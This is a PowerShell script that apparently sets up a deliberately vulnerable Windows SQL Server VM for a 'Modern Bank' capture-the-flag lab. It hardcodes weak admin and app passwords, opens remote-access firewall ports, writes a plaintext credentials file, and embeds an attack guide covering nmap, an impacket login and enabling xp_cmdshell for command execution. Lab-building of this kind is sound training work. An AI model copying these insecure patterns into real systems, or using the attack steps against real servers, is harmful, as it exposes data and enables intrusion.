# ============================================================================
# Modern Bank - Windows Database VM Setup Script (PowerShell)
# Usage: PowerShell -ExecutionPolicy Bypass -File .\setup_database.ps1 -BackendIP 192.168.1.100
#
# This is an alternative to the batch script with more features
# ============================================================================

param (
    [string]$BackendIP = "192.168.1.100",
    [string]$DatabaseName = "ModernBank",
    [string]$AdminUser = "Administrator",
    [string]$AdminPassword = "ModernBank@2024!Admin"
)

$ErrorActionPreference = "Continue"

# ============================================================================
# Helper Functions
# ============================================================================

function Write-Log {
    param (
        [string]$Message,
        [string]$Type = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = @{
        "INFO"    = "Cyan"
        "SUCCESS" = "Green"
        "WARNING" = "Yellow"
        "ERROR"   = "Red"
    }
    
    Write-Host "[$timestamp] [$Type] $Message" -ForegroundColor $color[$Type]
    Add-Content -Path $LogFile -Value "[$timestamp] [$Type] $Message"
}

function Test-Administrator {
    $principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# ============================================================================
# Initialize
# ============================================================================

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$LogFile = "$env:TEMP\modernbank_db_setup.log"
$CredentialsFile = "$env:ProgramFiles\ModernBank\CREDENTIALS.txt"

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  Modern Bank - Windows Database Tier Setup (PowerShell)" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

Write-Log "Starting Modern Bank Database Setup"
Write-Log "Backend IP: $BackendIP"
Write-Log "Script Directory: $ScriptDir"

# ============================================================================
# Check Administrator Privileges
# ============================================================================

if (-not (Test-Administrator)) {
    Write-Log "ERROR: This script must run as Administrator" -Type "ERROR"
    Write-Host ""
    Write-Host "Please run PowerShell as Administrator and try again." -ForegroundColor Red
    exit 1
}

Write-Log "Administrator privileges verified" -Type "SUCCESS"

# ============================================================================
# 1. Create ModernBank directory
# ============================================================================

$DBPath = "$env:ProgramFiles\ModernBank"
if (-not (Test-Path $DBPath)) {
    New-Item -ItemType Directory -Path $DBPath -Force | Out-Null
    Write-Log "Created ModernBank directory: $DBPath" -Type "SUCCESS"
}

# ============================================================================
# 2. Check SQL Server Installation
# ============================================================================

Write-Log "Checking SQL Server installation..."
$sqlRegPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server"

if (Test-Path $sqlRegPath) {
    Write-Log "SQL Server is installed" -Type "SUCCESS"
} else {
    Write-Log "WARNING: SQL Server not detected. Install SQL Server Express manually." -Type "WARNING"
    Write-Host "Download: https://www.microsoft.com/en-us/sql-server/sql-server-downloads" -ForegroundColor Yellow
}

# ============================================================================
# 3. Create Local Admin User
# ============================================================================

Write-Log "Checking for BankAdmin user..."
try {
    $user = Get-LocalUser -Name "BankAdmin" -ErrorAction SilentlyContinue
    if ($null -eq $user) {
        $secPassword = ConvertTo-SecureString "ModernBank@2024!Admin" -AsPlainText -Force
        New-LocalUser -Name "BankAdmin" -Password $secPassword -FullName "Bank Administrator" | Out-Null
        Add-LocalGroupMember -Group "Administrators" -Member "BankAdmin"
        Write-Log "Created BankAdmin local user" -Type "SUCCESS"
    } else {
        Write-Log "BankAdmin user already exists" -Type "SUCCESS"
    }
} catch {
    Write-Log "Error creating user: $($_.Exception.Message)" -Type "WARNING"
}

# ============================================================================
# 4. Deploy SQL Server Schema
# ============================================================================

Write-Log "Deploying database schema..."

$SchemaFile = Join-Path $ScriptDir "schema.sql"
if (Test-Path $SchemaFile) {
    # Try to execute using sqlcmd
    try {
        $CmdPath = $null
        if (Get-Command sqlcmd -ErrorAction SilentlyContinue) {
            $CmdPath = (Get-Command sqlcmd).Source
        } else {
            $KnownSqlCmdPaths = @(
                "C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe",
                "C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\180\Tools\Binn\sqlcmd.exe",
                "C:\Program Files\Microsoft SQL Server\110\Tools\Binn\sqlcmd.exe"
            )
            foreach ($path in $KnownSqlCmdPaths) {
                if (Test-Path $path) {
                    $CmdPath = $path
                    break
                }
            }
        }

        if ($CmdPath) {
            & $CmdPath -S "localhost\SQLEXPRESS" -i $SchemaFile -o "$LogFile.schema"
            Write-Log "Schema deployed successfully" -Type "SUCCESS"
        } else {
            Write-Log "sqlcmd.exe not found. Please execute manually:" -Type "WARNING"
            Write-Host "  sqlcmd -S localhost\SQLEXPRESS -i $SchemaFile" -ForegroundColor Yellow
        }
    } catch {
        Write-Log "Error deploying schema: $($_.Exception.Message)" -Type "WARNING"
    }
} else {
    Write-Log "schema.sql not found" -Type "WARNING"
}

# ============================================================================
# 5. Enable SQL Server Named Pipes
# ============================================================================

Write-Log "Enabling SQL Server protocols..."
try {
    $RegPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQLServer\SuperSocketNetLib"
    
    # Enable Named Pipes
    if (-not (Test-Path "$RegPath\Sm")) {
        New-Item -Path "$RegPath\Sm" -Force | Out-Null
    }
    Set-ItemProperty -Path "$RegPath\Sm" -Name "Enabled" -Value 1 -Type DWord
    
    Write-Log "SQL Server protocols enabled" -Type "SUCCESS"
} catch {
    Write-Log "Error enabling protocols: $($_.Exception.Message)" -Type "WARNING"
}

# ============================================================================
# 6. Create Credentials File (VULNERABLE)
# ============================================================================

Write-Log "Creating exposed credentials file..."
@"
=== Modern Bank Database VM - Exposed Credentials ===
Discovered: $(Get-Date)

ADMINISTRATOR ACCESS:
  Username: Administrator
  Password: $AdminPassword
  RDP Port: 3389
  Hostname: $env:COMPUTERNAME

SQL SERVER DATABASE:
  Server: localhost
  Instance: SQLEXPRESS
  Database: $DatabaseName
  Admin Login: Administrator (Windows Auth)
  
  App Credentials:
  - Username: bankapp
  - Password: BankApp@2024!Insecure
  
  Test Login:
  - Username: testuser
  - Password: testpass123

BACKEND VM ACCESS:
  Source IP: $BackendIP
  Firewall Rules: Configured to allow from Backend

SERVICE VULNERABILITIES:
  - RDP (3389): Weak credentials, no MFA
  - MSSQL (1433): Overprivileged application user
  - SMB (445): File sharing enabled
  - SSH (22): OpenSSH available if installed

EXPLOITATION PATH:
  1. From Backend, scan port 1433 (nmap, masscan)
  2. Connect with impacket-mssqlclient or sqlcmd
  3. Access ModernBank database
  4. Query banking data (Users, Accounts, Transactions)
  5. Extract sensitive information
  6. Escalate privileges via scheduled tasks
  7. Achieve RCE via xp_cmdshell

"@ | Out-File -FilePath $CredentialsFile -Encoding UTF8 -Force

Write-Log "Credentials file created: $CredentialsFile" -Type "SUCCESS"

# ============================================================================
# 7. Configure Windows Firewall
# ============================================================================

Write-Log "Configuring Windows Firewall rules..."

try {
    # RDP from Backend
    New-NetFirewallRule -DisplayName "RDP from Backend" `
        -Direction Inbound `
        -Action Allow `
        -Protocol TCP `
        -LocalPort 3389 `
        -RemoteAddress $BackendIP `
        -ErrorAction SilentlyContinue | Out-Null
    
    # MSSQL from Backend
    New-NetFirewallRule -DisplayName "MSSQL from Backend" `
        -Direction Inbound `
        -Action Allow `
        -Protocol TCP `
        -LocalPort 1433 `
        -RemoteAddress $BackendIP `
        -ErrorAction SilentlyContinue | Out-Null
    
    # SMB from Backend
    New-NetFirewallRule -DisplayName "SMB from Backend" `
        -Direction Inbound `
        -Action Allow `
        -Protocol TCP `
        -LocalPort 445 `
        -RemoteAddress $BackendIP `
        -ErrorAction SilentlyContinue | Out-Null
    
    # SSH from Backend (if available)
    New-NetFirewallRule -DisplayName "SSH from Backend" `
        -Direction Inbound `
        -Action Allow `
        -Protocol TCP `
        -LocalPort 22 `
        -RemoteAddress $BackendIP `
        -ErrorAction SilentlyContinue | Out-Null
    
    Write-Log "Firewall rules configured" -Type "SUCCESS"
} catch {
    Write-Log "Error configuring firewall: $($_.Exception.Message)" -Type "WARNING"
}

# ============================================================================
# 8. Start Services
# ============================================================================

Write-Log "Starting required services..."

try {
    # SQL Server
    $sqlService = Get-Service -Name "MSSQL`$SQLEXPRESS" -ErrorAction SilentlyContinue
    if ($null -ne $sqlService -and $sqlService.Status -ne "Running") {
        Start-Service -Name "MSSQL`$SQLEXPRESS"
        Write-Log "SQL Server service started" -Type "SUCCESS"
    }
    
    # SSH (if available)
    $sshService = Get-Service -Name "sshd" -ErrorAction SilentlyContinue
    if ($null -ne $sshService -and $sshService.Status -ne "Running") {
        Start-Service -Name "sshd"
        Write-Log "SSH service started" -Type "SUCCESS"
    }
} catch {
    Write-Log "Error starting services: $($_.Exception.Message)" -Type "WARNING"
}

# ============================================================================
# 9. Documentation
# ============================================================================

Write-Log "Creating CTF documentation..."

$CTFDoc = @"
# Modern Bank Database VM - CTF Documentation

## Attack Path from Backend

### Step 1: Port Scanning
\`\`\`bash
# From Backend VM
nmap -sV -p 1433,3389,445 $env:COMPUTERNAME
\`\`\`

### Step 2: MSSQL Connection
\`\`\`bash
# Using impacket
impacket-mssqlclient -db $DatabaseName Administrator:'$AdminPassword'@$env:COMPUTERNAME

# Using sqlcmd
sqlcmd -S $env:COMPUTERNAME\SQLEXPRESS -U Administrator -P '$AdminPassword'
\`\`\`

### Step 3: Database Exploitation
\`\`\`sql
-- List users and accounts
SELECT * FROM Users;
SELECT * FROM Accounts;
SELECT * FROM Transactions;

-- Extract sensitive data
SELECT Username, Email, FullName FROM Users;
SELECT AccountNumber, Balance FROM Accounts;
\`\`\`

### Step 4: Privilege Escalation
\`\`\`sql
-- Enable xp_cmdshell for RCE
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute system command
EXEC xp_cmdshell 'whoami';
\`\`\`

## Vulnerabilities

- **Weak Credentials:** Administrator/ModernBank@2024!Admin
- **Overprivileged App User:** bankapp has db_owner role
- **xp_cmdshell Available:** Can execute system commands
- **No Audit Logging:** Changes not logged
- **Open Firewall:** RDP, MSSQL, SMB accessible
- **No Encryption:** Credentials stored in plain text

## Success Indicators

✓ Connect to MSSQL database
✓ Query banking tables
✓ Extract user and transaction data
✓ Enable xp_cmdshell and execute commands
✓ Achieve RCE as MSSQL service account
✓ Extract Audit Log for compliance breach
✓ Complete lateral movement chain

"@ | Out-File -FilePath "$DBPath\CTF_GUIDE.md" -Encoding UTF8 -Force

Write-Log "CTF documentation created" -Type "SUCCESS"

# ============================================================================
# Print Summary
# ============================================================================

Write-Host ""
Write-Host "============================================================" -ForegroundColor Green
Write-Host "  Database Setup Complete!" -ForegroundColor Green
Write-Host "============================================================" -ForegroundColor Green
Write-Host ""
Write-Host "Windows VM Information:" -ForegroundColor Cyan
Write-Host "  Hostname: $env:COMPUTERNAME" -ForegroundColor Yellow
Write-Host "  Backend IP: $BackendIP" -ForegroundColor Yellow
Write-Host ""
Write-Host "SQL Server:" -ForegroundColor Cyan
Write-Host "  Instance: localhost\SQLEXPRESS" -ForegroundColor Yellow
Write-Host "  Database: $DatabaseName" -ForegroundColor Yellow
Write-Host "  Admin: Administrator / $AdminPassword" -ForegroundColor Yellow
Write-Host "  App User: bankapp / BankApp@2024!Insecure" -ForegroundColor Yellow
Write-Host ""
Write-Host "Firewall Rules:" -ForegroundColor Cyan
Write-Host "  ✓ RDP (3389) - From $BackendIP" -ForegroundColor Yellow
Write-Host "  ✓ MSSQL (1433) - From $BackendIP" -ForegroundColor Yellow
Write-Host "  ✓ SMB (445) - From $BackendIP" -ForegroundColor Yellow
Write-Host "  ✓ SSH (22) - From $BackendIP" -ForegroundColor Yellow
Write-Host ""
Write-Host "Exposed Credentials:" -ForegroundColor Cyan
Write-Host "  File: $CredentialsFile" -ForegroundColor Yellow
Write-Host ""
Write-Host "Documentation:" -ForegroundColor Cyan
Write-Host "  CTF Guide: $DBPath\CTF_GUIDE.md" -ForegroundColor Yellow
Write-Host "  Log File: $LogFile" -ForegroundColor Yellow
Write-Host ""

Write-Log "Database VM setup completed successfully" -Type "SUCCESS"
